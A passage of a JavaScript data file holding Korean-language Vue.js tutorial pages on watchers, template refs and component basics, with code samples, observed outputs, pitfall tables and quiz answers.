            body: "(1) watch(prefs, save)로 reactive 객체를 직접 넘기면 암묵적으로 deep이라 중첩 변경에도 돕니다(실제로 확인). 비용은 매 변경마다 전체 순회이고 newValue === oldValue라 무엇이 바뀌었는지는 모릅니다. 객체가 크면 3.5의 { deep: 2 }로 깊이를 제한하거나, 저장이 필요한 경로만 watch(() => prefs.theme, …)처럼 getter로 좁힙니다. 저장이 잦으면 customRef 디바운스나 콜백 안 디바운스를. (2) watch(items, scrollToLast, { flush: 'post' }). 기본 pre는 DOM 갱신 전이라 새 항목이 아직 없습니다(실제로 pre의 DOM은 옛 값, post는 새 값). ref([])에 push로 추가한다면 깊이가 필요하니 { deep: true }도, 또는 교체 방식으로 추가합니다. (3) watchEffect는 동기 실행 중 읽은 것만 추적합니다. await 뒤의 filter.value는 기록되지 않습니다(실제로 runs 2에서 멈춤). filter를 await 전에 읽어 변수에 담거나(const f = filter.value), 소스를 명시하는 watch([url, filter], …)로 바꿉니다. 경쟁 조건도 함께 처리하려면 onCleanup으로 옛 요청을 중단합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Watchers", href: `${DOCS}/guide/essentials/watchers` },
      { label: "watch() · watchEffect()", href: `${DOCS}/api/reactivity-core#watch` },
      { label: "customRef", href: `${DOCS}/api/reactivity-advanced#customref` },
    ],
  },

  {
    id: "vg-ess-refs",
    name: "템플릿 ref",
    tagline: "DOM 요소나 자식 인스턴스를 직접 잡는 길 — 마운트 뒤에만, 그리고 자식은 expose 한 것만",
    intro:
      "필수 개념 열한째 페이지입니다. 반응성이 DOM을 대신 다루지만, 포커스·측정·서드파티 라이브러리처럼 요소를 직접 만져야 할 때 ref 속성을 씁니다. <input ref=\"input\">과 3.5+의 useTemplateRef('input')(그 전은 같은 이름의 ref(null), Options API는 this.$refs.input). 규칙: '마운트 뒤에만 접근할 수 있다'(첫 렌더 중엔 null). v-if로 사라질 수 있으니 watch에서는 null 검사. v-for 안의 ref는 배열(순서 보장 없음). 함수 ref :ref=\"(el) => …\"는 갱신마다, 언마운트 때 null. 컴포넌트에 ref를 걸면 인스턴스인데 <script setup> 컴포넌트는 '기본 비공개'라 defineExpose한 것만 보입니다. 실제로 돌려 보면 setup과 beforeMount에서 null, mounted에서 INPUT, v-for ref는 ['a','b','c'], 함수 ref는 SPAN, expose({ pub })한 자식은 child.pub '공개'·child.secret undefined, Options 자식은 전부 보였습니다. 이 노드의 질문은 하나입니다. 언제 무엇이 잡히나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<input ref=\"my-input\" />. Composition API 3.5+: const input = useTemplateRef('my-input'); onMounted(() => input.value.focus()). 인자 문자열이 템플릿의 ref 값과 같아야 합니다. 3.5 전: 같은 이름의 const input = ref(null) 선언. Options API: this.$refs.input. '첫 렌더 중에는 요소가 아직 없어 null·undefined'. watch로 ref를 보면 v-if로 사라질 때 null이 되니 검사. v-for 안: 3.5+ useTemplateRef에 배열이 담기고(그 전은 ref([])), '소스 배열과 같은 순서를 보장하지 않는다'. 함수 ref: :ref=\"(el) => { /* el 또는 null */ }\"는 갱신마다 불리고 언마운트 때 null. 컴포넌트 ref: 자식 인스턴스. Options API나 <script setup>이 아닌 자식은 모든 것이 보이지만 '<script setup> 컴포넌트는 기본 비공개'라 defineExpose({ a, b })한 것만. 'defineExpose는 await 전에'. Options API는 expose: ['publicData'] 옵션. 문서의 조언: '컴포넌트 ref는 꼭 필요할 때만. props/emit으로 먼저'.",
        code: "<script setup>\nimport { useTemplateRef, onMounted } from 'vue'\nconst input = useTemplateRef('my-input')          // 3.5+ · 이름이 템플릿 ref 와 같아야\nconst items = useTemplateRef('items')             // v-for → 배열 (순서 보장 없음)\nconst child = useTemplateRef('child')             // 컴포넌트 → 인스턴스 (expose 한 것만)\nonMounted(() => { input.value.focus(); child.value.open() })\n</script>\n<template>\n  <input ref=\"my-input\" />\n  <li v-for=\"item in list\" :key=\"item.id\" ref=\"items\">{{ item }}</li>\n  <div :ref=\"(el) => { /* el 또는 null */ }\"></div>   <!-- 함수 ref -->\n  <Child ref=\"child\" />\n</template>\n\n<!-- Child.vue — 기본 비공개 -->\n<script setup>\nconst a = ref(1); const b = ref(2)\nfunction open() {}\ndefineExpose({ a, open })      // b 는 밖에서 undefined · await 전에\n</script>\n\n<!-- 3.5 전 -->\nconst input = ref(null)        // 템플릿 ref=\"input\" 과 같은 이름",
        terms: [
          {
            term: "useTemplateRef (3.5+)",
            body: "템플릿의 ref=\"이름\"과 같은 문자열로 그 요소·인스턴스를 담는 얕은 ref를 돌려주는 헬퍼입니다. 3.5 전의 '같은 이름의 ref(null) 선언' 방식은 변수 이름과 템플릿 문자열이 묶여 있어 리네임이 깨지기 쉬웠고, useTemplateRef는 그 연결을 명시합니다. 타입은 useTemplateRef<HTMLInputElement>('el')처럼 주고, 정적 ref면 Vue 언어 도구가 추론합니다. 마운트 전에는 null입니다.",
          },
          {
            term: "defineExpose",
            body: "<script setup> 컴포넌트가 부모의 템플릿 ref에 무엇을 보여 줄지 정하는 컴파일러 매크로입니다. <script setup>은 기본으로 닫혀 있어 선언하지 않으면 아무것도 안 보입니다(실제로 secret이 undefined). defineExpose({ method, state })로 공개할 것만 적습니다. 실제로 컴파일 출력에서 __expose({ model })이 됐습니다. 컴포넌트의 공개 API를 작게 유지하는 장치이고, 가능하면 props·emit·v-model로 소통하라는 것이 문서의 조언입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 useTemplateRef('input')의 값은 setup에서 null, onBeforeMount에서도 null, onMounted에서 INPUT이었습니다. v-for 세 항목의 ref는 mounted에서 ['a','b','c'] 세 요소, 함수 ref는 SPAN을 받았습니다. <script setup>처럼 setup(_, { expose })에서 expose({ pub })만 한 자식은 child.value.pub가 '공개', child.value.secret은 undefined. expose를 안 부른 자식(Options 식)은 everything이 '전부' 보였습니다. 컴파일러로 defineExpose({ model })을 가진 SFC를 컴파일하니 setup(__props, { expose: __expose, … }) 안에 __expose({ model })이 생겼습니다. 상호작용성 측정에서 함수 ref는 붙을 때 요소, 떼어질 때 null로 불렸습니다. 서버 렌더에서는 mounted가 돌지 않으니 템플릿 ref를 읽을 자리가 없습니다(SSR 생명주기 측정: 서버에서 돈 훅은 serverPrefetch만).",
        code: "// Chrome 156 · vue 3.5.45\nsetup:        input.value → null\nbeforeMount:  input.value → null\nmounted:      input.value → INPUT · items.value → [li, li, li] ('a','b','c') · fnEl → SPAN\n\n컴포넌트 ref:  expose({ pub }) 한 자식 → child.pub '공개' · child.secret undefined\n              expose 안 한 (Options 식) 자식 → open.everything '전부'\n\n// compileScript 출력\ndefineExpose({ model })  →  setup(__props, { expose: __expose, emit: __emit }) { … __expose({ model }) … }\n\n// 서버: mounted 가 안 돌아 ref 를 읽을 자리 없음 (돈 훅: serverPrefetch 만)",
      },
      {
        label: "문제: 모달이 열릴 때 첫 입력에 포커스가 안 된다",
        body: "<input v-if=\"open\" ref=\"first\">를 두고 open을 true로 바꾼 직후 first.value.focus()를 불렀습니다. first.value가 null이라 TypeError입니다. 템플릿 ref는 DOM이 만들어진 뒤에 채워지고, 상태 변경은 다음 틱에 DOM이 됩니다. 실제로 돌려 보면 마운트 전 ref는 null이었습니다. 처방은 셋 중 하나입니다. await nextTick() 뒤 포커스. watch(first, (el) => el?.focus())로 요소가 생기는 순간을 잡되 null 검사(v-if로 사라질 때 null). 또는 함수 ref :ref=\"(el) => el?.focus()\"로 붙는 순간. 모달이 컴포넌트라면 그 안의 onMounted에서 포커스하는 것이 가장 단순합니다. 자식 컴포넌트의 입력을 부모가 포커스하려면 자식이 defineExpose({ focus })로 메서드를 열어야 합니다.",
      },
      {
        label: "문제가 나는 경우: 시점과 공개 범위를 모를 때",
        body: "경우 ㄱ, 변경 직후 접근입니다. 위의 사고입니다. 경우 ㄴ, setup·beforeMount에서 ref 사용. null(실제로). onMounted. 경우 ㄷ, 이름 불일치. useTemplateRef('inputEl') vs ref=\"input\". null. 같은 문자열. 경우 ㄹ, 3.5 전 방식에서 변수 이름을 바꾸고 템플릿은 안 바꿈. 끊김. useTemplateRef로 명시. 경우 ㅁ, v-for ref의 순서를 소스 순서로 믿음. 보장 없음. 요소에 data-id를 두거나 함수 ref로 맵에 담기. 경우 ㅂ, <script setup> 자식의 내부 state를 ref로 읽음. undefined(실제로). defineExpose 또는 props/emit. 경우 ㅅ, defineExpose를 await 뒤에. 안 됨. await 전에. 경우 ㅇ, 함수 ref에서 null을 처리 안 함. 언마운트 때 null로 불려 에러. el?.. 경우 ㅈ, ref로 자식 상태를 바꿈. 데이터 흐름이 숨음. props/emit·v-model. 경우 ㅊ, SSR에서 setup에서 ref 접근. 서버엔 DOM 없음. onMounted. 경우 ㅋ, $refs를 템플릿 데이터로 바인딩. 비반응형. 상태로. 경우 ㅌ, ref 요소를 reactive 안에 넣음. 깊은 변환이 DOM 노드를 프록시로 감싸 비용·충돌. shallowRef(useTemplateRef는 얕음).",
        code: "경우               언제 생기나                       겉모습                            처방\nㄱ 변경 직후        open = true; el.focus()            null TypeError                     nextTick · watch · 함수 ref · 자식 onMounted\nㄴ 마운트 전        setup/beforeMount 에서              null (실제로)                      onMounted\nㄷ 이름 불일치       'inputEl' ≠ ref=\"input\"           null                              같은 문자열\nㄹ 리네임 끊김       3.5 전 변수명 변경                  null                              useTemplateRef\nㅁ v-for 순서 믿음   items.value[0]                    보장 없음                           data-* · 함수 ref 맵\nㅂ 비공개 자식       child.value.secret                 undefined (실제로)                  defineExpose · props/emit\nㅅ 늦은 expose      await 뒤 defineExpose               안 됨                             await 전\nㅇ null 미처리       함수 ref 언마운트                   에러                              el?.\nㅈ ref 로 조작       child.value.state = x              흐름 숨음                          props · emit · v-model\nㅊ SSR 접근         서버 setup 에서                     DOM 없음                           onMounted\nㅋ $refs 바인딩      {{ $refs.x.offsetWidth }}           비반응                             상태\nㅌ reactive 안 요소   reactive({ el })                  프록시 비용·충돌                     shallowRef",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 템플릿 ref 는 '렌더의 결과물' 을 잡는 손잡이라 렌더 뒤에만 있고, 자식은 문을 열어 준 만큼만 보인다",
        body: "반응성은 상태 → DOM 방향이고, 템플릿 ref는 그 결과물(DOM 요소, 자식 인스턴스)로 거슬러 가는 손잡이입니다. 결과물이라 렌더 전엔 없고(ㄱ, ㄴ, ㅊ), 렌더 결과가 바뀌면 손잡이도 바뀝니다(v-if로 null, 함수 ref의 null ㅇ, v-for 배열의 순서 ㅁ). 자식 인스턴스는 또 다른 컴포넌트의 안이라, 캡슐화를 위해 <script setup>은 기본 닫힘이고 expose가 문입니다(ㅂ, ㅅ). 손잡이로 자식 상태를 바꾸면 '부모 → props → 자식, 자식 → emit → 부모'의 흐름 밖에서 바뀌어 추적이 어렵습니다(ㅈ). 처방은 ref를 'DOM API가 꼭 필요한 자리(포커스·측정·서드파티)'에 한정하고, 시점은 onMounted·nextTick·watch로 맞추고, 자식과의 소통은 props·emit·v-model을 먼저 쓰는 것입니다.",
        code: "상태 ──렌더──▶ DOM · 자식 인스턴스   ◀── 템플릿 ref (결과물의 손잡이)\n  렌더 전 = 없음 (ㄱ ㄴ ㅊ) · 결과 바뀌면 손잡이도 (v-if null · 함수 ref null ㅇ · v-for 순서 ㅁ)\n  자식 = 다른 컴포넌트 안 → 기본 닫힘 · expose 가 문 (ㅂ ㅅ) · 손잡이로 상태 변경은 흐름 밖 (ㅈ)\n\n쓰는 자리: 포커스 · 측정 · 서드파티   ·   시점: onMounted · nextTick · watch   ·   소통: props · emit · v-model 먼저",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "지금까지의 전부를 묶는 단위가 다음 페이지 '컴포넌트 기초'입니다. props, emit, slot, 동적 컴포넌트, 그리고 in-DOM 템플릿 함정. 실제로 돌려 보면 props 검증 경고 셋과 Boolean 캐스팅, <my-row/>가 뒤를 삼키는 모양을 확인했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 차트 라이브러리를 <canvas ref=\"canvas\">에 초기화하고 데이터가 바뀌면 갱신하려 합니다. 어디서 초기화하고 어디서 갱신하나요? (2) 부모가 자식 <SearchBox>의 입력에 포커스를 주려 합니다. 어떻게? (3) v-for로 그린 행들 중 특정 id의 요소로 스크롤해야 합니다. ref 배열의 순서를 믿어도 될까요?",
        notes: [
          {
            title: "답",
            body: "(1) 초기화는 onMounted입니다. 그때 canvas.value가 요소입니다(실제로 setup·beforeMount는 null). 라이브러리 인스턴스는 reactive에 넣지 말고 보통 변수나 shallowRef에 둡니다. 갱신은 watch(data, (d) => chart.update(d), { deep: true })(data가 reactive면 deep 자동) 또는 DOM 크기가 필요하면 flush: 'post'. 정리는 onUnmounted에서 chart.destroy(). (2) SearchBox가 <script setup>이면 기본 비공개라 부모의 ref로 안의 input에 닿을 수 없습니다(실제로 secret undefined). SearchBox 안에서 const input = useTemplateRef('input'); defineExpose({ focus: () => input.value?.focus() })로 메서드를 열고, 부모는 const box = useTemplateRef('box'); box.value.focus(). 또는 부모가 autofocus prop을 내려 자식이 onMounted에서 스스로 포커스하면 ref가 필요 없습니다. (3) 문서가 '소스 배열과 같은 순서를 보장하지 않는다'고 적으니 믿지 않습니다. 각 행에 :data-id=\"row.id\"를 두고 컨테이너 ref에서 querySelector(`[data-id=\"${id}\"]`)로 찾거나, 함수 ref :ref=\"(el) => el && (map.set(row.id, el))\"로 id → 요소 맵을 만듭니다(언마운트 때 null이 오니 삭제 처리).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Template Refs", href: `${DOCS}/guide/essentials/template-refs` },
      { label: "useTemplateRef()", href: `${DOCS}/api/composition-api-helpers#usetemplateref` },
      { label: "defineExpose", href: `${DOCS}/api/sfc-script-setup#defineexpose` },
    ],
  },

  {
    id: "vg-ess-components",
    name: "컴포넌트 기초",
    tagline: "props 로 내려보내고 emit 으로 올려보내고 slot 으로 내용을 넘긴다 — 그리고 HTML 파서가 끼어드는 자리",
    intro:
      "필수 개념 열두째 페이지입니다. 컴포넌트는 UI를 독립적이고 재사용 가능한 조각으로 나누는 단위입니다. SFC로 정의하고 import해서 템플릿에 태그로 쓰며, 쓸 때마다 새 인스턴스(각자 state). props는 부모 → 자식 데이터(defineProps, '기본으로 어떤 값이든 어떤 prop에 넘길 수 있다'), 이벤트는 자식 → 부모(defineEmits, $emit), slot은 부모가 자식 안에 내용을 넘기는 자리, <component :is>는 동적 컴포넌트(전환되면 언마운트, 유지하려면 KeepAlive). 그리고 in-DOM 템플릿 파싱 주의: 대소문자 구분 없음(kebab-case로), 자기 닫힘 태그 불가(닫는 태그 명시), 요소 배치 제약(<table> 안은 <tr is=\"vue:blog-post-row\">). 실제로 돌려 보면 props 검증 경고 셋('custom validator check failed', 'type check failed … Expected Number with value 3, got String with value \"3\"', 'Missing required prop'), Boolean 캐스팅(<Flags a c d> → true false \"\" true), <my-row/>가 뒤 형제를 삼키는 모양을 확인했습니다. 이 노드의 질문은 하나입니다. 컴포넌트 경계를 넘는 것은 무엇이고 어느 방향인가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "정의: SFC(.vue) 또는 템플릿 문자열을 가진 객체. 사용: import ButtonCounter from './ButtonCounter.vue' 뒤 <ButtonCounter />. <script setup>에서는 import만으로 쓸 수 있고, 아니면 components 옵션. 각 사용이 별도 인스턴스라 각자 count를 가집니다. PascalCase 태그 권장(SFC). props: <script setup>의 defineProps(['title']) 또는 객체 형. 부모가 <BlogPost title=\"My journey\" :title=\"post.title\">. '기본으로 어떤 값이든 어떤 prop에 넘길 수 있다'(검증은 심화에서). 이벤트: 자식이 $emit('enlarge-text') 또는 const emit = defineEmits(['enlarge-text']); emit('enlarge-text'). 부모가 @enlarge-text=\"postFontSize += 0.1\". slot: 자식 템플릿의 <slot />이 부모가 넘긴 내용의 자리. 동적 컴포넌트: <component :is=\"currentTab\">에 등록된 이름 문자열이나 컴포넌트 객체. '전환되면 이전 컴포넌트는 언마운트'. 유지는 <KeepAlive>. in-DOM 템플릿 주의(SFC·문자열 템플릿·x-template에는 해당 없음): 대소문자(<blog-post post-title=\"hello!\" @update-post>), 자기 닫힘(<my-component></my-component>), 배치(<table><tr is=\"vue:blog-post-row\">, 'is 값은 vue: 접두').",
        code: "<!-- ButtonCounter.vue -->\n<script setup>\nimport { ref } from 'vue'\nconst props = defineProps(['title'])              // 부모 → 자식\nconst emit = defineEmits(['enlarge-text'])        // 자식 → 부모\nconst count = ref(0)                              // 인스턴스마다 따로\n</script>\n<template>\n  <h4>{{ title }}</h4>\n  <button @click=\"count++; emit('enlarge-text')\">Clicked {{ count }} times</button>\n  <slot />                                        <!-- 부모가 넘긴 내용 -->\n</template>\n\n<!-- 부모 -->\n<script setup>\nimport ButtonCounter from './ButtonCounter.vue'   // <script setup> 이면 import 만\nconst tabs = { Home, Posts }; const current = ref('Home')\n</script>\n<template>\n  <ButtonCounter title=\"정적\" :title=\"post.title\" @enlarge-text=\"size += 0.1\">안의 내용</ButtonCounter>\n  <component :is=\"tabs[current]\" />               <!-- 동적 · 전환 시 언마운트 → KeepAlive -->\n</template>\n\n<!-- in-DOM 템플릿에서는 -->\n<blog-post post-title=\"hello!\" @update-post=\"onUpdate\"></blog-post>   <!-- kebab · 닫는 태그 -->\n<table><tr is=\"vue:blog-post-row\"></tr></table>                       <!-- vue: 접두 -->",
        terms: [
          {
            term: "props 와 emit 의 방향",
            body: "데이터는 부모에서 자식으로 props로 내려가고(단방향, 자식은 바꾸지 않음), 자식에서 부모로는 emit으로 '일어난 일'을 올려 보냅니다. 부모가 그 이벤트를 듣고 자기 상태를 바꾸면 props로 다시 내려갑니다. 이 한 바퀴가 Vue 컴포넌트 소통의 기본이고, v-model은 그것을 modelValue prop + update:modelValue 이벤트로 줄인 것입니다. 자식이 props를 직접 고치면 경고입니다(실제로 'Set operation on key \"x\" failed: target is readonly.').",
          },
          {
            term: "동적 컴포넌트 (<component :is>)",
            body: "어느 컴포넌트를 렌더할지 런타임 값으로 정하는 특수 요소입니다. :is에 등록된 이름 문자열이나 컴포넌트 객체(또는 HTML 태그 이름)를 넘깁니다. 값이 바뀌면 이전 컴포넌트는 언마운트되어 state가 사라지고, <KeepAlive>로 감싸면 캐시됩니다(실제로 돌아왔을 때 A:1 유지). 탭 UI의 기본 도구입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node에서 props: { size: { type: String, validator: v => ['s','m'].includes(v) }, count: Number, required: { type: String, required: true } }인 컴포넌트에 size=\"xl\", count=\"3\"을 넘기고 required를 빼니 경고 셋. '[Vue warn]: Invalid prop: custom validator check failed for prop \"size\".', 'Invalid prop: type check failed for prop \"count\". Expected Number with value 3, got String with value \"3\".', 'Missing required prop: \"required\"'. Chrome에서 Boolean 캐스팅: props { a: Boolean, b: Boolean, c: [String, Boolean], d: [Boolean, String] }에 <Flags a c d />를 주니 a=true(속성만 있음), b=false(없음), c=\"\"(String이 먼저라 빈 문자열), d=true(Boolean이 먼저). emits에 click을 선언한 자식의 @click은 emit('click', 'from child')만 받고 네이티브 click은 안 왔으며, 선언 없는 자식은 네이티브 click이 루트로 폴스루되어 'Raw: click'. in-DOM 템플릿: <MyRow>는 <myrow>로, <my-row/>는 뒤 형제를 삼켜 렌더에서 사라졌고, <table><my-row>는 밖으로, <tr is=\"vue:my-row\">만 제자리. 자식의 props.x = 2는 '[Vue warn] Set operation on key \"x\" failed: target is readonly.'였고 객체 prop의 안쪽 props.o.a = 2는 경고 없이 부모의 o.a까지 바뀌었습니다. 동적 컴포넌트를 KeepAlive 없이 바꾸면 unmounted가 돌고, KeepAlive 안에서는 deactivated/activated로 상태(A:1)가 유지됐습니다.",
        code: "// Node — props 검증 경고\n<Btn size=\"xl\" :count=\"'3'\" />  (required 누락)\n→ [Vue warn]: Invalid prop: custom validator check failed for prop \"size\".\n→ [Vue warn]: Invalid prop: type check failed for prop \"count\". Expected Number with value 3, got String with value \"3\".\n→ [Vue warn]: Missing required prop: \"required\"\n\n// Chrome — Boolean 캐스팅\nprops { a: Boolean, b: Boolean, c: [String, Boolean], d: [Boolean, String] } · <Flags a c d />  → a true · b false · c \"\" · d true\n\n// emits 선언과 네이티브 click\nemits: ['click'] 자식 @click → emit 만 ('from child')      선언 없는 자식 @click → 네이티브 폴스루 ('click')\n\n// props 변경\nprops.x = 2    → [Vue warn] Set operation on key \"x\" failed: target is readonly.\nprops.o.a = 2  → 경고 없음 · 부모의 o.a 도 2 (객체 안은 공유)\n\n// in-DOM\n<MyRow> → <myrow> (Failed to resolve component: myrow) · <my-row/> → 뒤 형제 삼킴 · <table><my-row> → 밖으로 · <tr is=\"vue:my-row\"> ✓",
      },
      {
        label: "문제: 자식이 받은 숫자 prop 이 문자열이어서 계산이 '3' + 1 = '31' 이 된다",
        body: "<Counter count=\"3\" />로 넘기고 자식에서 count + 1을 했더니 '31'입니다. 속성에 따옴표 값은 문자열입니다. 숫자·불리언·객체·배열을 넘길 때는 :count=\"3\"처럼 v-bind여야 JS 식으로 평가됩니다. 자식이 props: { count: Number }로 타입을 선언했으면 개발 모드에서 'type check failed for prop \"count\". Expected Number with value 3, got String with value \"3\"' 경고가 나서 바로 보입니다(실제로 확인). 문서의 '기본으로 어떤 값이든 넘길 수 있다'가 뜻하는 것이 이 자리이고, 심화의 props 검증이 그 처방입니다. 스타일 가이드 A 규칙 '상세한 prop 정의'도 같은 이유입니다.",
      },
      {
        label: "문제가 나는 경우: 경계와 파서를 모를 때",
        body: "경우 ㄱ, 정적 속성으로 숫자입니다. 위의 사고입니다. 경우 ㄴ, 자식이 props를 고침. 경고(실제로). 로컬 ref로 복사하거나 emit. 경우 ㄷ, 객체 prop의 안을 고침. 경고 없이 부모까지 바뀜(실제로). 의도가 아니면 복사. 경우 ㄹ, emit 이름을 camelCase로 듣고 kebab으로 냄(또는 반대). 템플릿은 kebab, emit은 camelCase 권장이고 Vue가 변환. 경우 ㅁ, 컴포넌트 이벤트가 버블링될 거라 기대. 안 됨. 단계마다 emit 또는 provide/스토어. 경우 ㅂ, <component :is>에 import한 컴포넌트 이름 문자열. <script setup>에서는 등록이 없어 객체를 넘겨야. 경우 ㅅ, 탭 전환에 state 유지 기대. 언마운트됨(실제로). KeepAlive. 경우 ㅇ, in-DOM에서 PascalCase·자기 닫힘·table 배치. 파서 함정(실제로). kebab·닫는 태그·is=\"vue:\". 경우 ㅈ, 한 파일에 컴포넌트 여럿을 default export로. SFC는 하나. named export나 파일 분리. 경우 ㅊ, 자식이 slot 없이 자식 내용을 받길 기대. <slot/>이 있어야 렌더(실제로 my-row/가 삼킨 내용은 사라짐). 경우 ㅋ, emits 선언 없이 @click을 걸어 두 번 울림(네이티브 + emit). emits: ['click'] 선언. 경우 ㅌ, Boolean prop에 ''가 false일 거라 기대. 속성 존재 = true, [String, Boolean]이면 ''(실제로). 타입 순서.",
        code: "경우               언제 생기나                       겉모습                                       처방\nㄱ 정적 숫자        count=\"3\"                        '3' 문자열 · type check failed 경고             :count=\"3\"\nㄴ props 변경       props.x = 2                       Set operation on key \"x\" failed: target is readonly.   로컬 ref · emit\nㄷ 객체 안 변경      props.o.a = 2                     부모까지 바뀜 (경고 없음)                       복사 · emit\nㄹ 이름 케이스       emit('fooBar') / @foo-bar          Vue 가 변환 — 보통 됨                         camelCase emit · kebab 듣기\nㅁ 버블링 기대       손자 emit 을 조부모가               안 옴                                        단계 emit · provide · 스토어\nㅂ :is 문자열        <script setup> 에서 'Foo'          못 찾음                                      객체 전달\nㅅ 탭 state         <component :is> 전환               언마운트 · 초기화                              KeepAlive\nㅇ in-DOM 함정       <MyRow/> in HTML                  소문자 · 삼킴 · 밖으로                         kebab · 닫기 · vue:\nㅈ 다중 default      한 .vue 에 둘                     컴파일 에러                                   파일 분리\nㅊ slot 없음        자식에 내용                        사라짐                                       <slot/>\nㅋ 미선언 click      @click 두 번                      네이티브 + emit                               emits 선언\nㅌ Boolean ''       <X flag>                          true · [String, Boolean] 은 ''                 타입 순서",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 컴포넌트 경계는 세 통로(props↓ · emit↑ · slot↓)이고, 통로 밖은 공유되지 않아야 한다",
        body: "컴포넌트는 state를 안에 가두고 세 통로로만 바깥과 소통합니다. props는 아래로(단방향, 자식은 읽기 전용 ㄴ), emit은 위로(한 단계만, 버블링 없음 ㅁ), slot은 내용을 아래로(자리가 있어야 ㅊ). 통로의 계약을 어기면 경고이거나 숨은 공유입니다. 객체 prop의 안은 참조라 공유되어 자식이 고치면 부모도 바뀌는데 경고가 없고(ㄷ), 속성 문자열은 타입 계약을 깨며(ㄱ, 검증이 처방), emits 미선언은 네이티브와 emit이 겹치고(ㅋ), Boolean은 HTML 속성 규칙을 따릅니다(ㅌ). 동적 컴포넌트는 통로가 아니라 '어느 컴포넌트인가'를 바꾸는 것이라 전환은 수명 교체입니다(ㅅ). 그리고 in-DOM 템플릿은 이 전부보다 앞에 HTML 파서가 서 있습니다(ㅇ). 처방은 세 통로의 계약(타입·방향·자리)을 선언으로 명시하는 것이고, 그것이 다음 장 '컴포넌트 심화'입니다.",
        code: "            ┌──────────── 컴포넌트 (state 는 안에) ────────────┐\n부모 ──props──▶│ 읽기 전용 (ㄴ) · 객체 안은 참조 공유 (ㄷ) · 타입은 선언으로 (ㄱ ㅌ) │\n부모 ◀──emit───│ 한 단계만 (ㅁ) · emits 선언으로 네이티브와 구분 (ㅋ)             │\n부모 ──slot───▶│ <slot/> 자리가 있어야 (ㅊ)                                      │\n            └────────────────────────────────────────────────────┘\n<component :is>  = 어느 컴포넌트인가 → 전환은 수명 교체 (ㅅ) → KeepAlive\nin-DOM 템플릿     = 이 전부 앞에 HTML 파서 (ㅇ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "컴포넌트를 시간 축에 놓는 것이 이 장의 마지막 페이지 '라이프사이클 훅'입니다. 실제로 돌려 보면 순서는 부모 setup → 부모 beforeMount → 자식 setup → 자식 beforeMount → 자식 mounted → 부모 mounted였고, 갱신은 부모 beforeUpdate → 자식 beforeUpdate → 자식 updated → 부모 updated였습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) <ProductCard :product=\"p\" />에서 자식이 product.qty를 +1 버튼으로 바꿉니다. 부모의 목록도 바뀌는데 경고가 없습니다. 괜찮을까요? (2) 서버 템플릿 페이지에 <product-list> 컴포넌트를 in-DOM으로 넣고 안에 <product-card/>를 반복했습니다. 카드가 하나만 보입니다. 왜? (3) 탭 셋을 <component :is>로 바꾸는데 각 탭의 스크롤 위치와 입력이 사라집니다. 어떻게?",
        notes: [
          {
            title: "답",
            body: "(1) 동작은 하지만 설계상 위험합니다. 객체 prop은 참조라 자식이 안을 고치면 부모 데이터가 바뀌고 경고가 없습니다(실제로 props.o.a = 2가 부모까지 바뀜). 문서는 '부모와 자식이 긴밀히 결합된 경우가 아니면 피하고 이벤트를 emit하라'고 적습니다. 자식은 emit('increment', product.id)를 올리고 부모가 바꾸거나, v-model:qty로 계약을 명시합니다. 그래야 변경의 출처가 부모에 모입니다. (2) in-DOM 템플릿은 HTML 파서가 먼저 읽습니다. <product-card/>의 자기 닫힘은 무시되어 열린 태그가 되고, 뒤의 모든 카드가 첫 카드의 자식이 됩니다. 첫 카드에 <slot/>이 없으면 자식들은 버려집니다. 실제로 돌려 보면 <my-row/> 뒤의 형제가 그렇게 사라졌습니다. <product-card></product-card>로 닫거나 템플릿을 SFC·문자열로 옮깁니다. (3) <component :is>는 전환 시 이전 컴포넌트를 언마운트합니다(실제로 unmounted 호출). <KeepAlive><component :is=\"tab\" /></KeepAlive>로 감싸면 인스턴스가 캐시되어 입력 state가 남고(실제로 A:1 유지), 스크롤 위치는 DOM이 떨어졌다 붙으므로 onDeactivated에서 저장하고 onActivated에서 복원합니다. 탭이 많으면 max로 LRU 제한을 둡니다(실제로 max=2에서 가장 오래 안 쓴 것이 언마운트).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Components Basics", href: `${DOCS}/guide/essentials/component-basics` },
      { label: "Props", href: `${DOCS}/guide/components/props` },
      { label: "Component Events", href: `${DOCS}/guide/components/events` },
      { label: "KeepAlive", href: `${DOCS}/guide/built-ins/keep-alive` },
    ],
  },

  {
    id: "vg-ess-lifecycle",
    name: "라이프사이클 훅",
    tagline: "setup → beforeMount → 자식들 → mounted → (갱신) → beforeUnmount → unmounted — 그리고 동기로 등록할 것",
    intro:
      "필수 개념 마지막 페이지입니다. 컴포넌트 인스턴스는 만들어지고(setup), DOM이 되기 전(beforeMount), DOM에 붙은 뒤(mounted), 갱신 전후(beforeUpdate·updated), 떼어지기 전후(beforeUnmount·unmounted)를 지나고, 그 각 지점에 코드를 걸 수 있습니다. onMounted·onUpdated·onUnmounted가 가장 흔합니다. 규칙은 '훅은 setup 중에 동기로 등록해야 한다'(setTimeout 안의 onMounted는 동작하지 않음. 외부 함수에서 불러도 호출 스택이 setup에서 동기로 이어지면 됨). Options API는 this가 인스턴스이니 화살표 함수를 쓰지 말 것. 실제로 돌려 보면 순서는 부모 setup → 부모 beforeMount → 자식 setup → 자식 beforeMount → 자식 mounted → 부모 mounted, 갱신은 부모 beforeUpdate → 자식 beforeUpdate → 자식 updated → 부모 updated, 언마운트는 부모 beforeUnmount → 자식 beforeUnmount → 자식 unmounted → 부모 unmounted였습니다. 서버에서는 setup과 serverPrefetch만 돌았습니다. 이 노드의 질문은 하나입니다. 어느 시점에 무엇이 있고 없나.",
    blocks: [
      {
        label: "무엇을 다루나",
